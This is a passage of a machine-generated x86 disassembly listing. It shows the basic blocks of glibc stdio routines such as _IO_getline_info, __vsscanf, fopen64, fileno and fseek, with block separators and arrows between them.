0xb064bbc:	mov	ebp, dword ptr [edi + 4]
0xb064bbf:	mov	esi, dword ptr [edi + 8]
0xb064bc2:	sub	esi, ebp
0xb064bc4:	jmp	0xb064a55
None
|
|
|
v
0xb064a0d:	mov	eax, dword ptr [esp + 0x40]
0xb064a11:	mov	edx, dword ptr [eax]
0xb064a13:	test	edx, edx
0xb064a15:	je	0xb064a21
None
|
|
|
v
0xb064a55:	mov	dword ptr [esp + 0x14], 0
0xb064a5d:	jmp	0xb064aea
None
|
|
|
v
0xb0649da:	mov	ecx, 1
0xb0649df:	cmp	dword ptr gs:[0xc], 0
0xb0649e7:	je	0xb0649ea
None
|
|
|
v
0xb064b0b:	mov	eax, 0x7fffffff
0xb064b10:	sub	eax, dword ptr [esp + 0x14]
0xb064b14:	cmp	esi, eax
0xb064b16:	jge	0xb064be4
None
|
|
|
v
0xb0649f3:	mov	eax, dword ptr [edi + 0x48]
0xb0649f6:	mov	edx, dword ptr [edi + 0x48]
0xb0649f9:	mov	ecx, dword ptr [edi]
0xb0649fb:	mov	dword ptr [eax + 8], esi
0xb0649fe:	add	dword ptr [edx + 4], 1
0xb064a02:	mov	edx, ecx
0xb064a04:	and	ecx, 0x20
0xb064a07:	jne	0xb064b48
None
|
|
|
v
0xb064b73:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb0649a0:	add	ebx, 0x146660
0xb0649a6:	mov	edi, dword ptr [esp + 0x4c]
0xb0649aa:	test	esi, esi
0xb0649ac:	je	0xb064bc9
None
|
|
|
v
0xb064b90:	mov	eax, dword ptr [esp + 0x40]
0xb064b94:	mov	edx, dword ptr [esp + 0x18]
0xb064b98:	mov	eax, dword ptr [eax]
0xb064b9a:	mov	byte ptr [eax + edx], 0
0xb064b9e:	mov	edx, dword ptr [edi]
0xb064ba0:	jmp	0xb064b50
None
|
|
|
v
0xb064a37:	mov	edx, dword ptr [esp + 0x40]
0xb064a3b:	test	eax, eax
0xb064a3d:	mov	dword ptr [edx], eax
0xb064a3f:	je	0xb064bb0
None
|
|
|
v
0xb064b62:	mov	dword ptr [edx + 8], 0
0xb064b69:	cmp	dword ptr gs:[0xc], 0
0xb064b71:	je	0xb064b74
None
|
|
|
v
0xb064be4:	mov	edx, dword ptr gs:[0]
0xb064beb:	mov	eax, dword ptr [ebx - 0xdc]
0xb064bf1:	mov	dword ptr [esp + 0x18], 0xffffffff
0xb064bf9:	mov	dword ptr [edx + eax], 0x4b
0xb064c00:	mov	edx, dword ptr [edi]
0xb064c02:	jmp	0xb064b50
None
|
|
|
v
0xb064ada:	mov	ebp, dword ptr [edi + 4]
0xb064add:	mov	esi, dword ptr [edi + 8]
0xb064ae0:	mov	eax, dword ptr [esp + 0x18]
0xb064ae4:	sub	esi, ebp
0xb064ae6:	mov	dword ptr [esp + 0x14], eax
0xb064aea:	mov	eax, dword ptr [esp + 0x48]
0xb064aee:	mov	dword ptr [esp + 8], esi
0xb064af2:	mov	dword ptr [esp], ebp
0xb064af5:	mov	dword ptr [esp + 4], eax
0xb064af9:	call	0xb07c430
None
|
|
|
v
0xb064aa2:	add	eax, dword ptr [esp + 0x14]
0xb064aa6:	mov	dword ptr [esp + 8], esi
0xb064aaa:	mov	dword ptr [esp + 4], ebp
0xb064aae:	mov	dword ptr [esp], eax
0xb064ab1:	mov	dword ptr [esp + 0x1c], edx
0xb064ab5:	call	0xb07d0b0
None
|
|
|
v
0xb064bb0:	mov	edx, dword ptr [edi]
0xb064bb2:	mov	dword ptr [esp + 0x18], 0xffffffff
0xb064bba:	jmp	0xb064b50
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_getline_info
TOTAL BLOCKS :33
0xb064df0:	mov	ecx, dword ptr [ebx - 0xf8]
0xb064df6:	test	ecx, ecx
0xb064df8:	je	0xb064e06
None
|
|
|
v
0xb064deb:	jmp	0xb064d40
None
|
|
|
v
0xb064da5:	mov	eax, dword ptr [esp + 0x54]
0xb064da9:	mov	dword ptr [eax], 0xffffffff
0xb064daf:	mov	eax, dword ptr [esp + 0x18]
0xb064db3:	sub	eax, dword ptr [esp + 0x44]
0xb064db7:	jmp	0xb064d48
None
|
|
|
v
0xb064ce5:	mov	eax, dword ptr [esp + 0x18]
0xb064ce9:	sub	edi, esi
0xb064ceb:	mov	dword ptr [esp + 8], esi
0xb064cef:	mov	dword ptr [esp + 4], ecx
0xb064cf3:	mov	dword ptr [esp], eax
0xb064cf6:	call	0xb07d0b0
None
|
|
|
v
0xb064d12:	mov	dword ptr [esp], ebp
0xb064d15:	call	0xb070a80
None
|
|
|
v
0xb064dfa:	mov	dword ptr [ebp + 0x68], 0xffffffff
0xb064e01:	jmp	0xb064ca7
None
|
|
|
v
0xb064d68:	add	ecx, 1
0xb064d6b:	cmp	dword ptr [esp + 0x50], 1
0xb064d70:	sbb	esi, -1
0xb064d73:	mov	eax, dword ptr [esp + 0x18]
0xb064d77:	mov	dword ptr [esp + 8], esi
0xb064d7b:	mov	dword ptr [esp + 4], edx
0xb064d7f:	mov	dword ptr [esp + 0x1c], ecx
0xb064d83:	mov	dword ptr [esp], eax
0xb064d86:	call	0xb07d0b0
None
|
|
|
v
0xb064d9d:	mov	edx, dword ptr [esp + 0x54]
0xb064da1:	test	edx, edx
0xb064da3:	je	0xb064d40
None
|
|
|
v
0xb064db9:	cmp	dword ptr [esp + 0x50], 0
0xb064dbe:	mov	eax, dword ptr [esp + 0x18]
0xb064dc2:	jle	0xb064dd5
None
|
|
|
v
0xb064dc4:	movzx	edx, byte ptr [esp + 0x4c]
0xb064dc9:	add	dword ptr [esp + 0x18], 1
0xb064dce:	mov	byte ptr [eax], dl
0xb064dd0:	jmp	0xb064d40
None
|
|
|
v
0xb064d73:	mov	eax, dword ptr [esp + 0x18]
0xb064d77:	mov	dword ptr [esp + 8], esi
0xb064d7b:	mov	dword ptr [esp + 4], edx
0xb064d7f:	mov	dword ptr [esp + 0x1c], ecx
0xb064d83:	mov	dword ptr [esp], eax
0xb064d86:	call	0xb07d0b0
None
|
|
|
v
0xb064d48:	add	esp, 0x2c
0xb064d4b:	pop	ebx
0xb064d4c:	pop	esi
0xb064d4d:	pop	edi
0xb064d4e:	pop	ebp
0xb064d4f:	ret	
None
|
|
|
v
0xb064d8b:	mov	ecx, dword ptr [esp + 0x1c]
0xb064d8f:	lea	eax, dword ptr [esi + edi]
0xb064d92:	mov	dword ptr [ebp + 4], ecx
0xb064d95:	add	esp, 0x2c
0xb064d98:	pop	ebx
0xb064d99:	pop	esi
0xb064d9a:	pop	edi
0xb064d9b:	pop	ebp
0xb064d9c:	ret	
None
|
|
|
v
0xb064d29:	mov	edx, dword ptr [esp + 0x18]
0xb064d2d:	sub	edi, 1
0xb064d30:	test	edi, edi
0xb064d32:	mov	byte ptr [edx], al
0xb064d34:	lea	eax, dword ptr [edx + 1]
0xb064d37:	mov	dword ptr [esp + 0x18], eax
0xb064d3b:	jne	0xb064d06
None
|
|
|
v
0xb064c80:	add	ebx, 0x146380
0xb064c86:	mov	ebp, dword ptr [esp + 0x40]
0xb064c8a:	mov	edi, dword ptr [esp + 0x48]
0xb064c8e:	test	eax, eax
0xb064c90:	je	0xb064c9c
None
|
|
|
v
0xb064d40:	mov	eax, dword ptr [esp + 0x18]
0xb064d44:	sub	eax, dword ptr [esp + 0x44]
0xb064d48:	add	esp, 0x2c
0xb064d4b:	pop	ebx
0xb064d4c:	pop	esi
0xb064d4d:	pop	edi
0xb064d4e:	pop	ebp
0xb064d4f:	ret	
None
|
|
|
v
0xb064cb5:	jmp	0xb064d48
None
|
|
|
v
0xb064d3d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb064dd5:	je	0xb064d40
None
|
|
|
v
0xb064d06:	mov	ecx, dword ptr [ebp + 4]
0xb064d09:	mov	esi, dword ptr [ebp + 8]
0xb064d0c:	sub	esi, ecx
0xb064d0e:	test	esi, esi
0xb064d10:	jg	0xb064cc0
None
|
|
|
v
0xb064c92:	mov	eax, dword ptr [esp + 0x54]
0xb064c96:	mov	dword ptr [eax], 0
0xb064c9c:	mov	esi, dword ptr [ebp + 0x68]
0xb064c9f:	test	esi, esi
0xb064ca1:	je	0xb064df0
None
|
|
|
v
0xb064d50:	mov	edx, ecx
0xb064d52:	mov	esi, eax
0xb064d54:	mov	edi, dword ptr [esp + 0x18]
0xb064d58:	mov	ecx, eax
0xb064d5a:	mov	eax, dword ptr [esp + 0x50]
0xb064d5e:	sub	esi, edx
0xb064d60:	sub	edi, dword ptr [esp + 0x44]
0xb064d64:	test	eax, eax
0xb064d66:	js	0xb064d73
None
|
|
|
v
0xb064d1f:	cmp	eax, dword ptr [esp + 0x4c]
0xb064d23:	je	0xb064db9
None
|
|
|
v
0xb064ca7:	mov	eax, dword ptr [esp + 0x44]
0xb064cab:	mov	dword ptr [esp + 0x18], eax
0xb064caf:	xor	eax, eax
0xb064cb1:	test	edi, edi
0xb064cb3:	jne	0xb064d06
None
|
|
|
v
0xb064c70:	push	ebp
0xb064c71:	push	edi
0xb064c72:	push	esi
0xb064c73:	push	ebx
0xb064c74:	sub	esp, 0x2c
0xb064c77:	mov	eax, dword ptr [esp + 0x54]
0xb064c7b:	call	0xb1267db
None
|
|
|
v
0xb064cdd:	mov	ecx, dword ptr [esp + 0x1c]
0xb064ce1:	test	eax, eax
0xb064ce3:	jne	0xb064d50
None
|
|
|
v
0xb064c9c:	mov	esi, dword ptr [ebp + 0x68]
0xb064c9f:	test	esi, esi
0xb064ca1:	je	0xb064df0
None
|
|
|
v
0xb064e16:	jmp	0xb064ca7
None
|
|
|
v
0xb064ddb:	mov	eax, dword ptr [esp + 0x4c]
0xb064ddf:	mov	dword ptr [esp], ebp
0xb064de2:	mov	dword ptr [esp + 4], eax
0xb064de6:	call	0xb071270
None
|
|
|
v
0xb064d1a:	cmp	eax, 0xff
0xb064d1d:	je	0xb064d9d
None
|
|
|
v
0xb064cfb:	add	dword ptr [ebp + 4], esi
0xb064cfe:	add	dword ptr [esp + 0x18], esi
0xb064d02:	test	edi, edi
0xb064d04:	je	0xb064d40
None
|
|
|
v
0xb064cc0:	mov	eax, dword ptr [esp + 0x4c]
0xb064cc4:	cmp	esi, edi
0xb064cc6:	cmovae	esi, edi
0xb064cc9:	mov	dword ptr [esp], ecx
0xb064ccc:	mov	dword ptr [esp + 8], esi
0xb064cd0:	mov	dword ptr [esp + 4], eax
0xb064cd4:	mov	dword ptr [esp + 0x1c], ecx
0xb064cd8:	call	0xb07c430
None
|
|
|
v
0xb064e06:	mov	dword ptr [esp + 4], 0xffffffff
0xb064e0e:	mov	dword ptr [esp], ebp
0xb064e11:	call	0xb066ae0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_getline
TOTAL BLOCKS :2
0xb064e57:	add	esp, 0x2c
0xb064e5a:	ret	
None
|
|
|
v
0xb064e20:	sub	esp, 0x2c
0xb064e23:	mov	eax, dword ptr [esp + 0x40]
0xb064e27:	mov	dword ptr [esp + 0x14], 0
0xb064e2f:	mov	dword ptr [esp + 0x10], eax
0xb064e33:	mov	eax, dword ptr [esp + 0x3c]
0xb064e37:	mov	dword ptr [esp + 0xc], eax
0xb064e3b:	mov	eax, dword ptr [esp + 0x38]
0xb064e3f:	mov	dword ptr [esp + 8], eax
0xb064e43:	mov	eax, dword ptr [esp + 0x34]
0xb064e47:	mov	dword ptr [esp + 4], eax
0xb064e4b:	mov	eax, dword ptr [esp + 0x30]
0xb064e4f:	mov	dword ptr [esp], eax
0xb064e52:	call	0xb064c70
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0659b0
TOTAL BLOCKS :24
0xb065a5f:	test	ecx, ecx
0xb065a61:	jle	0xb065a68
None
|
|
|
v
0xb065a78:	call	0xb070880
None
|
|
|
v
0xb0659ef:	mov	ecx, dword ptr [ebp + 0x68]
0xb0659f2:	test	ecx, ecx
0xb0659f4:	js	0xb065a7f
None
|
|
|
v
0xb0659bc:	add	ebx, 0x145644
0xb0659c2:	mov	ebp, dword ptr [esp + 0x40]
0xb0659c6:	cmp	dword ptr [esp + 0x4c], 2
0xb0659cb:	mov	esi, dword ptr [esp + 0x44]
0xb0659cf:	mov	edi, dword ptr [esp + 0x48]
0xb0659d3:	ja	0xb065a98
None
|
|
|
v
0xb065a59:	cmp	byte ptr [ebp + 0x46], 0
0xb065a5d:	jne	0xb065a68
None
|
|
|
v
0xb0659fe:	mov	eax, dword ptr [ebp + 0x58]
0xb065a01:	mov	eax, dword ptr [eax + 0x20]
0xb065a04:	test	eax, eax
0xb065a06:	je	0xb065a1b
None
|
|
|
v
0xb065a7d:	jmp	0xb065a1b
None
|
|
|
v
0xb0659fa:	test	ecx, ecx
0xb0659fc:	jle	0xb065a1b
None
|
|
|
v
0xb065a1b:	movsx	eax, byte ptr [ebp + 0x46]
0xb065a1f:	mov	edx, dword ptr [esp + 0x50]
0xb065a23:	mov	eax, dword ptr [ebp + eax + 0x94]
0xb065a2a:	mov	dword ptr [esp + 0x10], edx
0xb065a2e:	mov	edx, dword ptr [esp + 0x4c]
0xb065a32:	mov	dword ptr [esp + 4], esi
0xb065a36:	mov	dword ptr [esp + 8], edi
0xb065a3a:	mov	dword ptr [esp], ebp
0xb065a3d:	mov	dword ptr [esp + 0xc], edx
0xb065a41:	call	dword ptr [eax + 0x24]
None
|
|
|
v
0xb065a7f:	cmp	dword ptr [ebp + 0x24], 0
0xb065a83:	jne	0xb065a08
None
|
|
|
v
0xb065a63:	call	0xb031970
None
|
|
|
v
0xb065a44:	add	esp, 0x2c
0xb065a47:	pop	ebx
0xb065a48:	pop	esi
0xb065a49:	pop	edi
0xb065a4a:	pop	ebp
0xb065a4b:	ret	
None
|
|
|
v
0xb065a50:	test	dword ptr [ebp], 0x100
0xb065a57:	je	0xb065a0f
None
|
|
|
v
0xb065ac2:	mov	ecx, dword ptr [ebp + 0x68]
0xb065ac5:	jmp	0xb065a08
None
|
|
|
v
0xb065a0f:	test	ecx, ecx
0xb065a11:	mov	dword ptr [esp], ebp
0xb065a14:	jle	0xb065a78
None
|
|
|
v
0xb065a08:	cmp	dword ptr [esp + 0x4c], 1
0xb065a0d:	je	0xb065a50
None
|
|
|
v
0xb0659d9:	mov	ecx, dword ptr [esp + 0x50]
0xb0659dd:	test	ecx, ecx
0xb0659df:	je	0xb065a1b
None
|
|
|
v
0xb065ab8:	cmp	dword ptr [ebp + 0x24], 0
0xb065abc:	je	0xb065a1b
None
|
|
|
v
0xb065a68:	mov	eax, dword ptr [ebp + 8]
0xb065a6b:	sub	eax, dword ptr [ebp + 4]
0xb065a6e:	cdq	
0xb065a6f:	sub	esi, eax
0xb065a71:	sbb	edi, edx
0xb065a73:	jmp	0xb065a0f
None
|
|
|
v
0xb0659e1:	mov	edx, dword ptr [ebx - 0xf8]
0xb0659e7:	test	edx, edx
0xb0659e9:	je	0xb065ab8
None
|
|
|
v
0xb065a16:	call	0xb06a5d0
None
|
|
|
v
0xb065a98:	mov	eax, dword ptr [ebx - 0xdc]
0xb065a9e:	mov	edx, dword ptr gs:[0]
0xb065aa5:	mov	dword ptr [edx + eax], 0x16
0xb065aac:	mov	eax, 0xffffffff
0xb065ab1:	mov	edx, 0xffffffff
0xb065ab6:	jmp	0xb065a44
None
|
|
|
v
0xb065a89:	lea	esi, dword ptr [esi]
0xb065a90:	jmp	0xb0659fa
None
|
|
|
v
0xb0659b0:	push	ebp
0xb0659b1:	push	edi
0xb0659b2:	push	esi
0xb0659b3:	push	ebx
0xb0659b4:	sub	esp, 0x2c
0xb0659b7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__vsscanf
TOTAL BLOCKS :5
0xb066247:	lea	eax, dword ptr [ebx - 0x500]
0xb06624d:	mov	dword ptr [esp + 0xb4], eax
0xb066254:	mov	eax, dword ptr [esp + 0xd0]
0xb06625b:	mov	dword ptr [esp], esi
0xb06625e:	mov	dword ptr [esp + 0xc], 0
0xb066266:	mov	dword ptr [esp + 8], 0
0xb06626e:	mov	dword ptr [esp + 4], eax
0xb066272:	call	0xb0722d0
None
|
|
|
v
0xb066277:	mov	eax, dword ptr [esp + 0xd8]
0xb06627e:	mov	dword ptr [esp], esi
0xb066281:	mov	dword ptr [esp + 0xc], 0
0xb066289:	mov	dword ptr [esp + 8], eax
0xb06628d:	mov	eax, dword ptr [esp + 0xd4]
0xb066294:	mov	dword ptr [esp + 4], eax
0xb066298:	call	0xb04d520
None
|
|
|
v
0xb066207:	add	ebx, 0x144df9
0xb06620d:	sub	esp, 0xc4
0xb066213:	lea	esi, dword ptr [esp + 0x20]
0xb066217:	mov	dword ptr [esp], esi
0xb06621a:	mov	dword ptr [esp + 0x10], 0
0xb066222:	mov	dword ptr [esp + 0xc], 0
0xb06622a:	mov	dword ptr [esp + 8], 0xffffffff
0xb066232:	mov	dword ptr [esp + 4], 0x8000
0xb06623a:	mov	dword ptr [esp + 0x68], 0
0xb066242:	call	0xb0710c0
None
|
|
|
v
0xb066200:	push	esi
0xb066201:	push	ebx
0xb066202:	call	0xb1267db
None
|
|
|
v
0xb06629d:	add	esp, 0xc4
0xb0662a3:	pop	ebx
0xb0662a4:	pop	esi
0xb0662a5:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fopen64
TOTAL BLOCKS :3
0xb06648d:	add	ebx, 0x144b73
0xb066493:	mov	dword ptr [esp + 8], 0
0xb06649b:	mov	dword ptr [esp + 4], eax
0xb06649f:	mov	eax, dword ptr [esp + 0x20]
0xb0664a3:	mov	dword ptr [esp], eax
0xb0664a6:	call	0xb063e90
None
|
|
|
v
0xb066480:	push	ebx
0xb066481:	sub	esp, 0x18
0xb066484:	mov	eax, dword ptr [esp + 0x24]
0xb066488:	call	0xb1267db
None
|
|
|
v
0xb0664ab:	add	esp, 0x18
0xb0664ae:	pop	ebx
0xb0664af:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b066ae0
TOTAL BLOCKS :37
0xb066b21:	cmp	esi, dword ptr [ebx + 0xd80]
0xb066b27:	je	0xb066cb8
None
|
|
|
v
0xb066b9b:	mov	edx, dword ptr [esp + 0x1c]
0xb066b9f:	cmp	dword ptr [esp + 0x24], 1
0xb066ba4:	jne	0xb066cec
None
|
|
|
v
0xb066d8b:	jne	0xb066dac
None
|
|
|
v
0xb066bbe:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb066d95:	pop	esi
0xb066d96:	pop	edi
0xb066d97:	ret	
None
|
|
|
v
0xb066ca9:	mov	eax, dword ptr [esp + 0x18]
0xb066cad:	add	esp, 0x3c
0xb066cb0:	pop	ebx
0xb066cb1:	pop	esi
0xb066cb2:	pop	edi
0xb066cb3:	pop	ebp
0xb066cb4:	ret	
None
|
|
|
v
0xb066bc0:	lea	eax, dword ptr [ebx - 0x1446a0]
0xb066bc6:	mov	dword ptr [edx + 0x40], eax
0xb066bc9:	lea	eax, dword ptr [ebx - 0x144760]
0xb066bcf:	mov	dword ptr [edx + 0x44], eax
0xb066bd2:	lea	eax, dword ptr [ebx - 0x144840]
0xb066bd8:	mov	dword ptr [edx + 0x48], eax
0xb066bdb:	lea	eax, dword ptr [ebx - 0x144880]
0xb066be1:	mov	dword ptr [edx + 0x4c], eax
0xb066be4:	lea	eax, dword ptr [ebx - 0x144860]
0xb066bea:	mov	dword ptr [edx + 0x50], eax
0xb066bed:	lea	eax, dword ptr [ebx - 0x1445c0]
0xb066bf3:	mov	dword ptr [edx + 0x54], eax
0xb066bf6:	lea	eax, dword ptr [ebx - 0x144850]
0xb066bfc:	mov	dword ptr [edx + 0x58], eax
0xb066bff:	mov	eax, dword ptr [esp + 0x20]
0xb066c03:	mov	dword ptr [edx + 0x5c], 1
0xb066c0a:	mov	dword ptr [edx + 0x74], 1
0xb066c11:	mov	dword ptr [edx + 0x6c], 1
0xb066c18:	mov	dword ptr [edx + 0x60], eax
0xb066c1b:	mov	eax, dword ptr [esi + 0x58]
0xb066c1e:	mov	dword ptr [edx + 0x88], 1
0xb066c28:	mov	dword ptr [edx + 0xa0], 1
0xb066c32:	mov	dword ptr [edx + 0x98], 1
0xb066c3c:	add	eax, 0x2c
0xb066c3f:	mov	dword ptr [edx + 0x78], eax
0xb066c42:	mov	eax, dword ptr [esp + 0x28]
0xb066c46:	mov	dword ptr [edx + 0x8c], eax
0xb066c4c:	mov	eax, dword ptr [esi + 0x58]
0xb066c4f:	add	eax, 0x2c
0xb066c52:	mov	dword ptr [edx + 0xa4], eax
0xb066c58:	lea	eax, dword ptr [ebx - 0x9ac]
0xb066c5e:	mov	dword ptr [edx + 0xb0], eax
0xb066c64:	mov	eax, dword ptr [esi + 0x58]
0xb066c67:	mov	eax, dword ptr [eax + 0xb8]
0xb066c6d:	mov	dword ptr [esi + 0x94], eax
0xb066c73:	movsx	eax, byte ptr [esi + 0x46]
0xb066c77:	mov	eax, dword ptr [esi + eax + 0x94]
0xb066c7e:	mov	dword ptr [esp + 0xc], 1
0xb066c86:	mov	dword ptr [esp + 4], 0
0xb066c8e:	mov	dword ptr [esp + 8], 0
0xb066c96:	mov	dword ptr [esp], esi
0xb066c99:	call	dword ptr [eax + 0x40]
None
|
|
|
v
0xb066baa:	cmp	dword ptr [esp + 0x2c], 1
0xb066baf:	jne	0xb066cc2
None
|
|
|
v
0xb066d8d:	pop	esi
0xb066d8e:	pop	edi
0xb066d8f:	ret	
None
|
|
|
v
0xb066d16:	nop	
0xb066d18:	nop	
0xb066d1a:	nop	
0xb066d1c:	nop	
0xb066d1e:	nop	
0xb066d20:	push	edi
0xb066d21:	push	esi
0xb066d22:	mov	esi, dword ptr [esp + 0xc]
0xb066d26:	mov	ecx, dword ptr [esi]
0xb066d28:	mov	eax, ecx
0xb066d2a:	and	eax, 0x8000
0xb066d2f:	jne	0xb066d90
None
|
|
|
v
0xb066d76:	mov	dword ptr [edx + 8], 0
0xb066d7d:	cmp	dword ptr gs:[0xc], 0
0xb066d85:	je	0xb066d88
None
|
|
|
v
0xb066d4f:	lock cmpxchg	dword ptr [edx], ecx
0xb066d53:	jne	0xb066da3
None
|
|
|
v
0xb066b48:	test	ebp, ebp
0xb066b4a:	je	0xb066ca9
None
|
|
|
v
0xb066da3:	lea	ecx, dword ptr [edx]
0xb066da5:	call	0xb0f9430
None
|
|
|
v
0xb066b15:	cmp	esi, dword ptr [ebx + 0xd84]
0xb066b1b:	je	0xb066cb8
None
|
|
|
v
0xb066daa:	jmp	0xb066d55
None
|
|
|
v
0xb066d31:	mov	edx, dword ptr [esi + 0x48]
0xb066d34:	mov	edi, dword ptr gs:[8]
0xb066d3b:	cmp	edi, dword ptr [edx + 8]
0xb066d3e:	je	0xb066d98
None
|
|
|
v
0xb066b2d:	cmp	esi, dword ptr [ebx + 0xd7c]
0xb066b33:	je	0xb066cb8
None
|
|
|
v
0xb066ca2:	mov	dword ptr [esi + 0x68], ebp
0xb066ca5:	mov	dword ptr [esp + 0x18], ebp
0xb066ca9:	mov	eax, dword ptr [esp + 0x18]
0xb066cad:	add	esp, 0x3c
0xb066cb0:	pop	ebx
0xb066cb1:	pop	esi
0xb066cb2:	pop	edi
0xb066cb3:	pop	ebp
0xb066cb4:	ret	
None
|
|
|
v
0xb066b50:	cmp	ebp, 1
0xb066b53:	jne	0xb066ca2
None
|
|
|
v
0xb066b39:	mov	eax, dword ptr [esi + 0x68]
0xb066b3c:	test	eax, eax
0xb066b3e:	mov	dword ptr [esp + 0x18], eax
0xb066b42:	jne	0xb066ca9
None
|
|
|
v
0xb066d98:	and	ecx, 0xffffffcf
0xb066d9b:	add	dword ptr [edx + 4], 1
0xb066d9f:	mov	dword ptr [esi], ecx
0xb066da1:	jmp	0xb066d70
None
|
|
|
v
0xb066cb8:	mov	dword ptr [esp + 0x18], 0xffffffff
0xb066cc0:	jmp	0xb066ca9
None
|
|
|
v
0xb066d70:	sub	dword ptr [edx + 4], 1
0xb066d74:	jne	0xb066d95
None
|
|
|
v
0xb066d40:	mov	ecx, 1
0xb066d45:	cmp	dword ptr gs:[0xc], 0
0xb066d4d:	je	0xb066d50
None
|
|
|
v
0xb066d55:	mov	eax, dword ptr [esi + 0x48]
0xb066d58:	mov	edx, dword ptr [esi + 0x48]
0xb066d5b:	mov	dword ptr [eax + 8], edi
0xb066d5e:	mov	eax, dword ptr [esi]
0xb066d60:	add	dword ptr [edx + 4], 1
0xb066d64:	mov	ecx, eax
0xb066d66:	and	ecx, 0xffffffcf
0xb066d69:	test	ah, 0x80
0xb066d6c:	mov	dword ptr [esi], ecx
0xb066d6e:	jne	0xb066d95
None
|
|
|
v
0xb066ae0:	push	ebp
0xb066ae1:	xor	edx, edx
0xb066ae3:	push	edi
0xb066ae4:	push	esi
0xb066ae5:	push	ebx
0xb066ae6:	sub	esp, 0x3c
0xb066ae9:	call	0xb1267db
None
|
|
|
v
0xb066dac:	lea	eax, dword ptr [edx]
0xb066dae:	call	0xb0f9460
None
|
|
|
v
0xb066d90:	and	ecx, 0xffffffcf
0xb066d93:	mov	dword ptr [esi], ecx
0xb066d95:	pop	esi
0xb066d96:	pop	edi
0xb066d97:	ret	
None
|
|
|
v
0xb066aee:	add	ebx, 0x144512
0xb066af4:	mov	eax, dword ptr [esp + 0x54]
0xb066af8:	mov	esi, dword ptr [esp + 0x50]
0xb066afc:	test	eax, eax
0xb066afe:	mov	eax, 0xffffffff
0xb066b03:	setne	dl
0xb066b06:	cmovns	eax, edx
0xb066b09:	mov	edx, dword ptr [ebx - 0xf8]
0xb066b0f:	mov	ebp, eax
0xb066b11:	test	edx, edx
0xb066b13:	jne	0xb066b39
None
|
|
|
v
0xb066cc2:	lea	eax, dword ptr [ebx - 0x499bd]
0xb066cc8:	mov	dword ptr [esp + 0xc], eax
0xb066ccc:	lea	eax, dword ptr [ebx - 0x499f3]
0xb066cd2:	mov	dword ptr [esp + 4], eax
0xb066cd6:	lea	eax, dword ptr [ebx - 0x499d3]
0xb066cdc:	mov	dword ptr [esp + 8], 0x8b
0xb066ce4:	mov	dword ptr [esp], eax
0xb066ce7:	call	0xb027820
None
|
|
|
v
0xb066d87:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb066db3:	jmp	0xb066d8d
None
|
|
|
v
0xb066bb5:	mov	eax, dword ptr [esp + 0x18]
0xb066bb9:	mov	ecx, 0x1e
0xb066bbe:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb066b59:	mov	edx, dword ptr [esi + 0x58]
0xb066b5c:	lea	eax, dword ptr [edx + 0x3c]
0xb066b5f:	mov	dword ptr [esi + 0x54], eax
0xb066b62:	mov	edi, eax
0xb066b64:	mov	eax, dword ptr [edx + 4]
0xb066b67:	mov	dword ptr [edx + 0x2c], 0
0xb066b6e:	mov	dword ptr [edx + 0x30], 0
0xb066b75:	mov	dword ptr [esp + 0x1c], edx
0xb066b79:	mov	dword ptr [edx], eax
0xb066b7b:	mov	eax, dword ptr [edx + 0xc]
0xb066b7e:	mov	dword ptr [edx + 0x10], eax
0xb066b81:	mov	eax, dword ptr [esi + 0x58]
0xb066b84:	mov	dword ptr [eax + 0x34], 0
0xb066b8b:	mov	dword ptr [eax + 0x38], 0
0xb066b92:	lea	eax, dword ptr [esp + 0x20]
0xb066b96:	call	0xb0a3ee0
None
|
|
|
v
0xb066cec:	lea	eax, dword ptr [ebx - 0x499bd]
0xb066cf2:	mov	dword ptr [esp + 0xc], eax
0xb066cf6:	lea	eax, dword ptr [ebx - 0x499f3]
0xb066cfc:	mov	dword ptr [esp + 4], eax
0xb066d00:	lea	eax, dword ptr [ebx - 0x499e9]
0xb066d06:	mov	dword ptr [esp + 8], 0x8a
0xb066d0e:	mov	dword ptr [esp], eax
0xb066d11:	call	0xb027820
None
|
|
|
v
0xb066c9c:	mov	dword ptr [esi + 0x4c], eax
0xb066c9f:	mov	dword ptr [esi + 0x50], edx
0xb066ca2:	mov	dword ptr [esi + 0x68], ebp
0xb066ca5:	mov	dword ptr [esp + 0x18], ebp
0xb066ca9:	mov	eax, dword ptr [esp + 0x18]
0xb066cad:	add	esp, 0x3c
0xb066cb0:	pop	ebx
0xb066cb1:	pop	esi
0xb066cb2:	pop	edi
0xb066cb3:	pop	ebp
0xb066cb4:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fileno
TOTAL BLOCKS :5
0xb066f40:	mov	eax, dword ptr [esp + 4]
0xb066f44:	call	0xb1267df
None
|
|
|
v
0xb066f5e:	ret	
None
|
|
|
v
0xb066f49:	add	ecx, 0x1440b7
0xb066f4f:	test	dword ptr [eax], 0x2000
0xb066f55:	je	0xb066f60
None
|
|
|
v
0xb066f60:	mov	eax, dword ptr [ecx - 0xdc]
0xb066f66:	mov	edx, dword ptr gs:[0]
0xb066f6d:	mov	dword ptr [edx + eax], 9
0xb066f74:	mov	eax, 0xffffffff
0xb066f79:	ret	
None
|
|
|
v
0xb066f57:	mov	eax, dword ptr [eax + 0x38]
0xb066f5a:	test	eax, eax
0xb066f5c:	js	0xb066f60
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fseek
TOTAL BLOCKS :18
0xb0674cc:	jne	0xb06751c
None
|
|
|
v
0xb067523:	jmp	0xb0674ce
None
|
|
|
v
0xb067466:	mov	eax, dword ptr [esi + 0x48]
0xb067469:	mov	edx, dword ptr [esi + 0x48]
0xb06746c:	mov	dword ptr [eax + 8], edi
0xb06746f:	add	dword ptr [edx + 4], 1
0xb067473:	mov	eax, dword ptr [esp + 0x38]
